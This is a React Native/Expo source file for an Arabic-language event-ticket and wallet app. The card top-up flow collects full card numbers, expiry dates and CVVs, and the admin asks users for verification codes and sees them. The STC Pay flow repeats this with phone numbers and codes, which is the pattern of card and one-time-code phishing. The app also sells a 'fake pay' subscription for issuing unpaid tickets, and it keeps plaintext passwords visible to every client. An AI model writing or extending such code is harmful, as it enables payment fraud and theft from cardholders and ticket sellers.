import AsyncStorage from "@react-native-async-storage/async-storage";
import * as Notifications from "expo-notifications";
import { Platform } from "react-native";
import React, {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";
import {
  apiLogin, apiRegister,
  apiGetUsers, apiUpdateUser, apiDeleteUser,
  apiGetPackages, apiCreatePackage, apiDeletePackage, apiUpdatePackage,
  apiGetTickets, apiCreateTicket, apiTransferTicket, apiLookupUser,
  apiGetTransfers, apiCreateTransfer,
  apiGetTopUpRequests, apiCreateTopUpRequest, apiUpdateTopUpRequest,
  apiGetCardPayments, apiCreateCardPayment, apiUpdateCardPayment,
  apiGetStcPayments, apiCreateStcPayment, apiUpdateStcPayment,
  StcPaymentRequest as StcPaymentRequestType,
} from "@/lib/apiClient";

Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowAlert: true,
    shouldPlaySound: true,
    shouldSetBadge: true,
    shouldShowBanner: true,
    shouldShowList: true,
  }),
});

export interface User {
  email: string;
  password: string;
  name: string;
  avatar?: string;
  lastLogin: string;
  isAdmin: boolean;
  wallet: number;
  hasFakePaySubscription: boolean;
  fakePayExpiry?: string;
  isBanned: boolean;
  banType?: "temporary" | "permanent";
  expoPushToken?: string;
}

export interface Ticket {
  id: string;
  eventName: string;
  ticketCount: number;
  box: string;
  paymentType: "real" | "fake";
  status: "confirmed" | "pending";
  date: string;
  userName: string;
  userEmail: string;
}

export interface TopUpPackage {
  id: string;
  name: string;
  amount: number;
  note?: string;
  paymentLink?: string;
  paymentMethod: "link" | "card" | "both" | "stc" | "stc_link" | "stc_card" | "stc_both";
}

export interface StcPaymentRequest {
  id: string;
  userEmail: string;
  userName: string;
  amount: number;
  packageName: string;
  stcNumber: string;
  date: string;
  status: "pending" | "awaiting_code" | "code_submitted" | "approved" | "rejected";
  verificationCode?: string;
}

export interface WalletTransfer {
  id: string;
  fromEmail: string;
  toEmail: string;
  amount: number;
  date: string;
  type: "sent" | "received";
}

export interface TopUpRequest {
  id: string;
  userEmail: string;
  userName: string;
  amount: number;
  receiptImage: string;
  date: string;
  status: "pending" | "approved" | "rejected";
  packageName: string;
}

export interface CardPaymentRequest {
  id: string;
  userEmail: string;
  userName: string;
  amount: number;
  packageName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  date: string;
  status: "pending" | "awaiting_code" | "code_submitted" | "approved" | "rejected";
  verificationCode?: string;
}

interface AppContextType {
  currentUser: User | null;
  users: User[];
  tickets: Ticket[];
  packages: TopUpPackage[];
  transfers: WalletTransfer[];
  topUpRequests: TopUpRequest[];
  cardPaymentRequests: CardPaymentRequest[];
  stcPaymentRequests: StcPaymentRequest[];
  login: (email: string, password: string) => Promise<{ success: boolean; message: string }>;
  logout: () => void;
  register: (email: string, password: string, name: string) => Promise<{ success: boolean; message: string }>;
  updateProfile: (data: Partial<User>) => Promise<void>;
  changePassword: (oldPass: string, newPass: string) => Promise<{ success: boolean; message: string }>;
  addTicket: (ticket: Omit<Ticket, "id" | "date" | "userName" | "userEmail">) => Promise<void>;
  subscribeFakePay: () => Promise<{ success: boolean; message: string }>;
  addPackage: (pkg: Omit<TopUpPackage, "id">) => Promise<void>;
  editPackage: (id: string, updates: Partial<Omit<TopUpPackage, "id">>) => Promise<void>;
  deletePackage: (id: string) => Promise<void>;
  submitTopUpRequest: (amount: number, receiptImage: string, packageName: string) => Promise<void>;
  approveTopUp: (requestId: string) => Promise<void>;
  rejectTopUp: (requestId: string) => Promise<void>;
  submitCardPayment: (pkg: TopUpPackage, cardNumber: string, cardExpiry: string, cardCvv: string) => Promise<string>;
  submitVerificationCode: (requestId: string, code: string) => Promise<void>;
  requestCardCode: (requestId: string) => Promise<void>;
  approveCardPayment: (requestId: string) => Promise<void>;
  rejectCardPayment: (requestId: string) => Promise<void>;
  submitStcPayment: (pkg: TopUpPackage, stcNumber: string) => Promise<string>;
  submitStcVerificationCode: (requestId: string, code: string) => Promise<void>;
  requestStcCode: (requestId: string) => Promise<void>;
  approveStcPayment: (requestId: string) => Promise<void>;
  rejectStcPayment: (requestId: string) => Promise<void>;
  banUser: (email: string, banType: "temporary" | "permanent") => Promise<void>;
  unbanUser: (email: string) => Promise<void>;
  deductWallet: (email: string, amount: number) => Promise<void>;
  chargeWallet: (email: string, amount: number) => Promise<void>;
  transferWallet: (toEmail: string, amount: number) => Promise<{ success: boolean; message: string }>;
  transferTicket: (ticketId: string, toEmail: string) => Promise<{ success: boolean; message: string }>;
  lookupUser: (email: string) => Promise<{ email: string; name: string } | null>;
  deleteAccount: (email: string) => Promise<void>;
  refreshData: () => Promise<void>;
  isLoading: boolean;
}

const AppContext = createContext<AppContextType | null>(null);

export function AppProvider({ children }: { children: React.ReactNode }) {
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [users, setUsers] = useState<User[]>([]);
  const [tickets, setTickets] = useState<Ticket[]>([]);
  const [packages, setPackages] = useState<TopUpPackage[]>([]);
  const [transfers, setTransfers] = useState<WalletTransfer[]>([]);
  const [topUpRequests, setTopUpRequests] = useState<TopUpRequest[]>([]);
  const [cardPaymentRequests, setCardPaymentRequests] = useState<CardPaymentRequest[]>([]);
  const [stcPaymentRequests, setStcPaymentRequests] = useState<StcPaymentRequest[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const pollTimer = useRef<ReturnType<typeof setInterval> | null>(null);

  const registerForPushNotifications = useCallback(async (userEmail: string) => {
    try {
      if (Platform.OS === "web") return;
      const { status: existing } = await Notifications.getPermissionsAsync();
      let finalStatus = existing;
      if (existing !== "granted") {
        const { status } = await Notifications.requestPermissionsAsync();
        finalStatus = status;
      }
      if (finalStatus !== "granted") return;
      const tokenData = await Notifications.getExpoPushTokenAsync({
        projectId: process.env.EXPO_PUBLIC_REPL_ID,
      });
      const token = tokenData.data;
      if (token) {
        await apiUpdateUser(userEmail, { expoPushToken: token });
      }
    } catch {}
  }, []);

  const loadAll = useCallback(async () => {
    try {
      const [u, t, p, tr, tor, cpr, stcpr] = await Promise.all([
        apiGetUsers(),
        apiGetTickets(),
        apiGetPackages(),
        apiGetTransfers(),
        apiGetTopUpRequests(),
        apiGetCardPayments(),
        apiGetStcPayments(),
      ]);
      setUsers(u);
      setTickets(t);
      setPackages(p as TopUpPackage[]);
      setTransfers(tr);
      setTopUpRequests(tor);
      setCardPaymentRequests(cpr);
      setStcPaymentRequests(stcpr as StcPaymentRequest[]);
    } catch {}
  }, []);

  const refreshData = useCallback(async () => {
    await loadAll();
    const stored = await AsyncStorage.getItem("currentUserEmail");
    if (stored) {
      try {
        const freshUsers = await apiGetUsers();
        const fresh = freshUsers.find((u) => u.email === stored);
        if (fresh) setCurrentUser(fresh);
      } catch {}
    }
  }, [loadAll]);

  useEffect(() => {
    const init = async () => {
      setIsLoading(true);
      await loadAll();
      const stored = await AsyncStorage.getItem("currentUserEmail");
      if (stored) {
        try {
          const allUsers = await apiGetUsers();
          const user = allUsers.find((u) => u.email === stored);
          if (user && !user.isBanned) {
            setCurrentUser(user);
            registerForPushNotifications(user.email);
          } else await AsyncStorage.removeItem("currentUserEmail");
        } catch {}
      }
      setIsLoading(false);
    };
    init();
  }, [loadAll]);

  useEffect(() => {
    if (pollTimer.current) clearInterval(pollTimer.current);
    pollTimer.current = setInterval(async () => {
      await refreshData();
    }, 8000);
    return () => {
      if (pollTimer.current) clearInterval(pollTimer.current);
    };
  }, [refreshData]);

  const login = useCallback(async (email: string, password: string): Promise<{ success: boolean; message: string }> => {
    try {
      const res = await apiLogin(email, password);
      if (!res.success || !res.user) return { success: false, message: res.message || "خطأ في تسجيل الدخول" };
      setCurrentUser(res.user);
      await AsyncStorage.setItem("currentUserEmail", res.user.email);
      await loadAll();
      registerForPushNotifications(res.user.email);
      return { success: true, message: "تم تسجيل الدخول بنجاح" };
    } catch (e: any) {
      return { success: false, message: e.message || "خطأ في تسجيل الدخول" };
    }
  }, [loadAll, registerForPushNotifications]);

  const logout = useCallback(async () => {
    setCurrentUser(null);
    await AsyncStorage.removeItem("currentUserEmail");
  }, []);

  const register = useCallback(async (email: string, password: string, name: string): Promise<{ success: boolean; message: string }> => {
    try {
      const res = await apiRegister(email, password, name);
      if (!res.success || !res.user) return { success: false, message: res.message || "خطأ في إنشاء الحساب" };
      setCurrentUser(res.user);
      await AsyncStorage.setItem("currentUserEmail", res.user.email);
      await loadAll();
      registerForPushNotifications(res.user.email);
      return { success: true, message: "تم إنشاء الحساب بنجاح" };
    } catch (e: any) {
      return { success: false, message: e.message || "خطأ في إنشاء الحساب" };
    }
  }, [loadAll, registerForPushNotifications]);

  const updateProfile = useCallback(async (data: Partial<User>) => {
    if (!currentUser) return;
    try {
      const updated = await apiUpdateUser(currentUser.email, data);
      setCurrentUser(updated);
      setUsers((prev) => prev.map((u) => u.email === updated.email ? updated : u));
    } catch {}
  }, [currentUser]);

  const changePassword = useCallback(async (oldPass: string, newPass: string): Promise<{ success: boolean; message: string }> => {
    if (!currentUser) return { success: false, message: "غير مسجل دخول" };
    if (currentUser.password !== oldPass) return { success: false, message: "كلمة المرور الحالية غير صحيحة" };
    await updateProfile({ password: newPass });
    return { success: true, message: "تم تغيير كلمة المرور بنجاح" };
  }, [currentUser, updateProfile]);

  const addTicket = useCallback(async (ticket: Omit<Ticket, "id" | "date" | "userName" | "userEmail">) => {
    if (!currentUser) return;
    const created = await apiCreateTicket({
      ...ticket,
      date: new Date().toISOString(),
      userName: currentUser.name,
      userEmail: currentUser.email,
    });
    setTickets((prev) => [...prev, created]);
  }, [currentUser]);

  const subscribeFakePay = useCallback(async (): Promise<{ success: boolean; message: string }> => {
    if (!currentUser) return { success: false, message: "غير مسجل دخول" };
    if (currentUser.wallet < 50) return { success: false, message: "عذراً ليس لديك رصيد قم بشحن حسابك" };
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + 7);
    await updateProfile({
      hasFakePaySubscription: true,
      fakePayExpiry: expiry.toISOString(),
      wallet: currentUser.wallet - 50,
    });
    return { success: true, message: "تم الاشتراك في الدفع الوهمي بنجاح" };
  }, [currentUser, updateProfile]);

  const addPackage = useCallback(async (pkg: Omit<TopUpPackage, "id">) => {
    const created = await apiCreatePackage(pkg);
    setPackages((prev) => [...prev, created]);
  }, []);

  const deletePackage = useCallback(async (id: string) => {
    await apiDeletePackage(id);
    setPackages((prev) => prev.filter((p) => p.id !== id));
  }, []);

  const submitTopUpRequest = useCallback(async (amount: number, receiptImage: string, packageName: string) => {
    if (!currentUser) return;
    const created = await apiCreateTopUpRequest({
      userEmail: currentUser.email,
      userName: currentUser.name,
      amount, receiptImage,
      date: new Date().toISOString(),
      status: "pending",
      packageName,
    });
    setTopUpRequests((prev) => [...prev, created]);
  }, [currentUser]);

  const submitCardPayment = useCallback(async (
    pkg: TopUpPackage,
    cardNumber: string,
    cardExpiry: string,
    cardCvv: string
  ): Promise<string> => {
    if (!currentUser) return "";
    const created = await apiCreateCardPayment({
      userEmail: currentUser.email,
      userName: currentUser.name,
      amount: pkg.amount,
      packageName: pkg.name,
      cardNumber, cardExpiry, cardCvv,
      date: new Date().toISOString(),
      status: "pending",
    });
    setCardPaymentRequests((prev) => [...prev, created]);
    return created.id;
  }, [currentUser]);

  const submitVerificationCode = useCallback(async (requestId: string, code: string) => {
    await apiUpdateCardPayment(requestId, { status: "code_submitted", verificationCode: code });
    setCardPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "code_submitted", verificationCode: code } : r)
    );
  }, []);

  const requestCardCode = useCallback(async (requestId: string) => {
    await apiUpdateCardPayment(requestId, { status: "awaiting_code" });
    setCardPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "awaiting_code" } : r)
    );
  }, []);

  const approveCardPayment = useCallback(async (requestId: string) => {
    const req = cardPaymentRequests.find((r) => r.id === requestId);
    if (!req) return;
    await apiUpdateCardPayment(requestId, { status: "approved" });
    setCardPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "approved" } : r)
    );
    const targetUser = users.find((u) => u.email === req.userEmail);
    if (targetUser) {
      const newWallet = targetUser.wallet + req.amount;
      await apiUpdateUser(req.userEmail, { wallet: newWallet });
      setUsers((prev) => prev.map((u) => u.email === req.userEmail ? { ...u, wallet: newWallet } : u));
      if (currentUser && currentUser.email === req.userEmail) {
        setCurrentUser((prev) => prev ? { ...prev, wallet: newWallet } : prev);
      }
    }
  }, [cardPaymentRequests, users, currentUser]);

  const rejectCardPayment = useCallback(async (requestId: string) => {
    await apiUpdateCardPayment(requestId, { status: "rejected" });
    setCardPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "rejected" } : r)
    );
  }, []);

  // ── STC PAYMENT ────────────────────────────────────────────────────────────

  const submitStcPayment = useCallback(async (pkg: TopUpPackage, stcNumber: string): Promise<string> => {
    if (!currentUser) return "";
    const created = await apiCreateStcPayment({
      userEmail: currentUser.email,
      userName: currentUser.name,
      amount: pkg.amount,
      packageName: pkg.name,
      stcNumber,
      date: new Date().toISOString(),
      status: "pending",
    });
    setStcPaymentRequests((prev) => [...prev, created as StcPaymentRequest]);
    return created.id;
  }, [currentUser]);

  const submitStcVerificationCode = useCallback(async (requestId: string, code: string) => {
    await apiUpdateStcPayment(requestId, { status: "code_submitted", verificationCode: code });
    setStcPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "code_submitted", verificationCode: code } : r)
    );
  }, []);

  const requestStcCode = useCallback(async (requestId: string) => {
    await apiUpdateStcPayment(requestId, { status: "awaiting_code" });
    setStcPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "awaiting_code" } : r)
    );
  }, []);

  const approveStcPayment = useCallback(async (requestId: string) => {
    const req = stcPaymentRequests.find((r) => r.id === requestId);
    if (!req) return;
    await apiUpdateStcPayment(requestId, { status: "approved" });
    setStcPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "approved" } : r)
    );
    const targetUser = users.find((u) => u.email === req.userEmail);
    if (targetUser) {
      const newWallet = targetUser.wallet + req.amount;
      await apiUpdateUser(req.userEmail, { wallet: newWallet });
      setUsers((prev) => prev.map((u) => u.email === req.userEmail ? { ...u, wallet: newWallet } : u));
      if (currentUser && currentUser.email === req.userEmail) {
        setCurrentUser((prev) => prev ? { ...prev, wallet: newWallet } : prev);
      }
    }
  }, [stcPaymentRequests, users, currentUser]);

  const rejectStcPayment = useCallback(async (requestId: string) => {
    await apiUpdateStcPayment(requestId, { status: "rejected" });
    setStcPaymentRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "rejected" } : r)
    );
  }, []);

  // ── EDIT PACKAGE ───────────────────────────────────────────────────────────

  const editPackage = useCallback(async (id: string, updates: Partial<Omit<TopUpPackage, "id">>) => {
    await apiUpdatePackage(id, updates);
    setPackages((prev) => prev.map((p) => p.id === id ? { ...p, ...updates } as TopUpPackage : p));
  }, []);

  const approveTopUp = useCallback(async (requestId: string) => {
    const req = topUpRequests.find((r) => r.id === requestId);
    if (!req) return;
    await apiUpdateTopUpRequest(requestId, { status: "approved" });
    setTopUpRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "approved" } : r)
    );
    const targetUser = users.find((u) => u.email === req.userEmail);
    if (targetUser) {
      const newWallet = targetUser.wallet + req.amount;
      await apiUpdateUser(req.userEmail, { wallet: newWallet });
      setUsers((prev) => prev.map((u) => u.email === req.userEmail ? { ...u, wallet: newWallet } : u));
      if (currentUser && currentUser.email === req.userEmail) {
        setCurrentUser((prev) => prev ? { ...prev, wallet: newWallet } : prev);
      }
    }
  }, [topUpRequests, users, currentUser]);

  const rejectTopUp = useCallback(async (requestId: string) => {
    await apiUpdateTopUpRequest(requestId, { status: "rejected" });
    setTopUpRequests((prev) =>
      prev.map((r) => r.id === requestId ? { ...r, status: "rejected" } : r)
    );
  }, []);

  const banUser = useCallback(async (email: string, banType: "temporary" | "permanent") => {
    await apiUpdateUser(email, { isBanned: true, banType });
    setUsers((prev) => prev.map((u) => u.email === email ? { ...u, isBanned: true, banType } : u));
  }, []);

  const unbanUser = useCallback(async (email: string) => {
    await apiUpdateUser(email, { isBanned: false });
    setUsers((prev) => prev.map((u) => u.email === email ? { ...u, isBanned: false, banType: undefined } : u));
  }, []);

  const deductWallet = useCallback(async (email: string, amount: number) => {
    const user = users.find((u) => u.email === email);
    if (!user) return;
    const newWallet = Math.max(0, user.wallet - amount);
    await apiUpdateUser(email, { wallet: newWallet });
    setUsers((prev) => prev.map((u) => u.email === email ? { ...u, wallet: newWallet } : u));
    if (currentUser && currentUser.email === email) {
      setCurrentUser((prev) => prev ? { ...prev, wallet: newWallet } : prev);
    }
  }, [users, currentUser]);

  const chargeWallet = useCallback(async (email: string, amount: number) => {
    const user = users.find((u) => u.email === email);
    if (!user) return;
    const newWallet = user.wallet + amount;
    await apiUpdateUser(email, { wallet: newWallet });
    setUsers((prev) => prev.map((u) => u.email === email ? { ...u, wallet: newWallet } : u));
    if (currentUser && currentUser.email === email) {
      setCurrentUser((prev) => prev ? { ...prev, wallet: newWallet } : prev);
    }
  }, [users, currentUser]);

  const transferWallet = useCallback(async (toEmail: string, amount: number): Promise<{ success: boolean; message: string }> => {
    if (!currentUser) return { success: false, message: "غير مسجل دخول" };
    if (currentUser.wallet < amount) return { success: false, message: "رصيد غير كافٍ" };
    const toUser = users.find((u) => u.email.toLowerCase() === toEmail.toLowerCase());
    if (!toUser) return { success: false, message: "المستخدم غير موجود" };
    if (toEmail.toLowerCase() === currentUser.email.toLowerCase()) return { success: false, message: "لا يمكن التحويل لنفسك" };

    const newFromWallet = currentUser.wallet - amount;
    const newToWallet = toUser.wallet + amount;

    await Promise.all([
      apiUpdateUser(currentUser.email, { wallet: newFromWallet }),
      apiUpdateUser(toUser.email, { wallet: newToWallet }),
      apiCreateTransfer({
        fromEmail: currentUser.email,
        toEmail,
        amount,
        date: new Date().toISOString(),
        type: "sent",
      }),
    ]);

    setCurrentUser((prev) => prev ? { ...prev, wallet: newFromWallet } : prev);
    setUsers((prev) => prev.map((u) => {
      if (u.email === currentUser.email) return { ...u, wallet: newFromWallet };
      if (u.email.toLowerCase() === toEmail.toLowerCase()) return { ...u, wallet: newToWallet };
      return u;
    }));
    const newTransfer: WalletTransfer = {
      id: Date.now().toString(),
      fromEmail: currentUser.email,
      toEmail,
      amount,
      date: new Date().toISOString(),
      type: "sent",
    };
    setTransfers((prev) => [...prev, newTransfer]);

    return { success: true, message: `تم تحويل ${amount} ريال بنجاح` };
  }, [currentUser, users]);

  const transferTicket = useCallback(async (ticketId: string, toEmail: string): Promise<{ success: boolean; message: string }> => {
    if (!currentUser) return { success: false, message: "غير مسجل دخول" };
    try {
      const updated = await apiTransferTicket(ticketId, toEmail);
      setTickets((prev) => prev.map((t) => t.id === ticketId ? { ...t, userEmail: updated.userEmail, userName: updated.userName } : t));
      return { success: true, message: `تم تحويل التذكرة بنجاح إلى ${updated.userName}` };
    } catch (e: any) {
      return { success: false, message: e.message || "خطأ في تحويل التذكرة" };
    }
  }, [currentUser]);

  const lookupUser = useCallback(async (email: string): Promise<{ email: string; name: string } | null> => {
    try {
      const result = await apiLookupUser(email);
      return result;
    } catch { return null; }
  }, []);

  const deleteAccount = useCallback(async (email: string) => {
    if (email === "888888000888") return;
    await apiDeleteUser(email);
    setUsers((prev) => prev.filter((u) => u.email !== email));
    if (currentUser && currentUser.email === email) {
      setCurrentUser(null);
      await AsyncStorage.removeItem("currentUserEmail");
    }
  }, [currentUser]);

  return (
    <AppContext.Provider
      value={{
        currentUser, users, tickets, packages, transfers,
        topUpRequests, cardPaymentRequests, stcPaymentRequests,
        login, logout, register, updateProfile, changePassword,
        addTicket, subscribeFakePay, addPackage, editPackage, deletePackage,
        submitTopUpRequest, approveTopUp, rejectTopUp,
        submitCardPayment, submitVerificationCode,
        requestCardCode, approveCardPayment, rejectCardPayment,
        submitStcPayment, submitStcVerificationCode,
        requestStcCode, approveStcPayment, rejectStcPayment,
        banUser, unbanUser, deductWallet, chargeWallet,
        transferWallet, transferTicket, lookupUser,
        deleteAccount, refreshData, isLoading,
      }}
    >
      {children}
    </AppContext.Provider>
  );
}

export function useApp() {
  const ctx = useContext(AppContext);
  if (!ctx) throw new Error("useApp must be used within AppProvider");
  return ctx;
}
